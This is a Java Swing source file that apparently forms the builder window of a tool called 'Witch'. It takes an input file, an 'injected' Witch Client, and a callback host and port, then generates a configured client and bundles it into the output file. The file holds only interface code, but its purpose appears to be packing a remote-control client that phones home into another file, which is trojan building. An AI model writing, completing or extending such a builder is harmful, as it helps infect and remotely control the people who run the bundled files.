package me.soda.witch.server.gui;

import me.soda.witch.server.utils.ConfigModifier;
import me.soda.witch.server.utils.Utils;
import net.miginfocom.swing.MigLayout;

import javax.swing.*;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.nio.file.Files;
import java.nio.file.Path;

public class GenerateWindow extends JPanel {
    public GenerateWindow() {
        setLayout(new MigLayout("insets 10"));

        JTextField inputFileText = new JTextField(50);
        JTextField outputFileText = new JTextField(50);
        JTextField injectedText = new JTextField(50);

        JButton inputSelectBtn = new JButton("📁");
        JButton outputSelectBtn = new JButton("📁");
        JButton injectedSelectBtn = new JButton("📁");

        JTextField hostText = new JTextField(40);
        JTextField portText = new JTextField(5);

        JButton generateBtn = new JButton("Generate");
        JButton bundleBtn = new JButton("Bundle");
        JButton autoBtn = new JButton("Generate & Bundle");

        generateBtn.addActionListener(e -> {
            try {
                ConfigModifier.generate(inputFileText.getText(), outputFileText.getText(), hostText.getText(), Integer.parseInt(portText.getText()));
                JOptionPane.showMessageDialog(this, "Operation completed");
            } catch (Exception ex) {
                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
            }
        });

        bundleBtn.addActionListener(e -> {
            try {
                ConfigModifier.bundle(inputFileText.getText(), injectedText.getText(), outputFileText.getText());
                JOptionPane.showMessageDialog(this, "Operation completed");
            } catch (Exception ex) {
                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
            }
        });

        autoBtn.addActionListener(e -> {
            try {
                ConfigModifier.generate(injectedText.getText(), "cache.tmp", hostText.getText(), Integer.parseInt(portText.getText()));
                ConfigModifier.bundle(inputFileText.getText(), "cache.tmp", outputFileText.getText());
                Files.deleteIfExists(Path.of("cache.tmp"));
                JOptionPane.showMessageDialog(this, "Operation completed");
            } catch (Exception ex) {
                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
            }
        });

        portText.addKeyListener(new KeyAdapter() {
            @Override
            public void keyTyped(KeyEvent e) {
                char c = e.getKeyChar();
                if (c < '0' || c > '9') e.consume();
            }
        });

        inputSelectBtn.addActionListener(e -> inputFileText.setText(Utils.chooseFile(false, this)));
        outputSelectBtn.addActionListener(e -> outputFileText.setText(Utils.chooseFile(true, this)));
        injectedSelectBtn.addActionListener(e -> injectedText.setText(Utils.chooseFile(false, this)));

        add(new JLabel("Input file"));
        add(inputFileText);
        add(inputSelectBtn, "wrap, pushx");

        add(new JLabel("Output file"));
        add(outputFileText);
        add(outputSelectBtn, "wrap, pushx");

        add(new JLabel("Injected file (Witch Client)"));
        add(injectedText);
        add(injectedSelectBtn, "wrap, pushx");

        add(new JLabel("Port"));
        add(portText, "split 3");
        add(new JLabel("Host"));
        add(hostText, "wrap, pushx");

        String btns = "gapleft 160, gapright 160, dock south";
        add(generateBtn, btns);
        add(bundleBtn, btns);
        add(autoBtn, btns);
    }
}
